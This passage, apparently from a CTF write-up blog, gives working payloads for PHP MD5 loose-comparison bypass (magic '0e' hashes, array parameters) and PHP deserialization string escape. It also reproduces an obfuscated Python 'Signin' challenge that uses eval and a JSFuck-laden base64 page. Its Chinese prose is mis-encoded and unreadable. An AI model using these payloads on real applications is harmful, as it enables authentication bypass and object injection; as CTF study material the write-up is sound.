class="token operator">-</span><span class="token number">1000</span><span class="token operator">></span> to connect to different parallel universes</code></pre><h4 id="meoÂõæÂ∫ä-Êñá‰ª∂ÂåÖÂê´-md5"><a href="#meoÂõæÂ∫ä-Êñá‰ª∂ÂåÖÂê´-md5" class="headerlink" title="meoÂõæÂ∫ä(Êñá‰ª∂ÂåÖÂê´ md5)"></a>meoÂõæÂ∫ä(Êñá‰ª∂ÂåÖÂê´ md5)</h4><p>ËøôÊ¨°Â¢ûÂä†‰∫ÜÊñá‰ª∂Â§¥Ê£ÄÊµã‰∫éÊòØÂä†‰∏ä<code>GIF89a</code>‰∫éÊòØ‰∏ä‰º†ÊàêÂäüÔºå‰∏çËøáÂèëÁé∞Âπ∂‰∏çÊòØÁõ¥Êé•ÁªôÂá∫Êñá‰ª∂ÁõÆÂΩïÔºåËÄåÊòØÈÄöËøáÂèÇÊï∞‰º†ÈÄíÔºå‰∫éÊòØÁåúÊµãÊñá‰ª∂ÂåÖÂê´ÊºèÊ¥û</p><p><img src="meo%E5%9B%BE%E5%BA%8A.png" loading="lazy"></p><p>ÂæóÂà∞ÊèêÁ§∫ËÆøÈóÆ<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ÁÆÄÂçïÁöÑmd5ÁªïËøáÔºåÂèØ‰ª•Êï∞ÁªÑÁªïËøáÔºå‰πüÂèØ‰ª•md5 0eÁªïËøá</p><pre class="language-php" data-language="php"><code class="language-php">PayloadÔºöparam1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span>    <span class="token constant">QLTHNDT</span> <span class="token operator">-></span> <span class="token property">0e405967825401955372549139051580</span>    <span class="token constant">QNKCDZO</span> <span class="token operator">-></span> <span class="token property">0e830400451993494058024219903391</span>     s878926199a <span class="token operator">-></span> <span class="token property">0e545993274517709034328855841020</span>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">11</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">22</span></code></pre><h4 id="Â§∫ÂëΩÂçÅ‰∏âÊû™-ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏"><a href="#Â§∫ÂëΩÂçÅ‰∏âÊû™-ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏" class="headerlink" title="Â§∫ÂëΩÂçÅ‰∏âÊû™(ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏)"></a>Â§∫ÂëΩÂçÅ‰∏âÊû™(ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'Â§∫ÂëΩÂçÅ‰∏âÊû™'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:&#123;s:5:"Chant";s:15:"Â§∫ÂëΩÂçÅ‰∏âÊû™";s:11:"Spear_Owner";s:6:"Nobody";&#125;Far away from COOL...</code></pre><p>ÁúãÂà∞‰∫Ü<code>require_once(&#39;Hanxin.exe.php&#39;);</code></p><p>Hanxin.exe.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span> <span class="token comment">// 12 32</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>Âè™Ë¶ÅËß¶Âèë<code>__toString</code>Âπ∂ËÆ©<code>Spear_Owner === &#39;MaoLei&#39;</code>Â∞±Ë°åÔºåÊú¨Êù•ÁúãÁùÄ<code>Make_a_Move</code>Ëøô‰∏™ÊñπÊ≥ïÊ≤°ÂèçÂ∫îËøáÊù•ÂèØ‰ª•ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏ÔºåÁúã‰∫ÜwpÂæóÂà∞ÊèêÁ§∫</p><p>ÈÇ£‰πàÂè™Ë¶ÅÈÄöËøáChantÊù•ÊûÑÈÄ†Ôºå‰ΩøÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</p><pre class="language-php" data-language="php"><code class="language-php">ÂÖàÁúãÊ≠£Â∏∏ÁöÑÂèçÂ∫èÂàóÂåñ<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Omg_It_Is_So_Cool_Bring_Me_My_Flag"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Chant"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Â∞ÜChantÊõøÊç¢‰∏∫<span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125; ,O:34:"</span>Omg_It_Is_So_Cool_Bring_Me_My_Flag<span class="token string double-quoted-string">":2:&#123;s:5:"</span>Chant<span class="token string double-quoted-string">";s:36:"</span><span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>Â≠óÁ¨¶‰∏≤Â¢ûÂä†‰∫Ü<span class="token number">35</span>Ôºå<span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12 ÊûÑÈÄ†35‰∏™di_yi_qiangÂç≥ÂèØÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</span>PayloadÔºö<span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>chant<span class="token operator">=</span>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>È¢òÁõÆ‰ª£Á†Å:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbX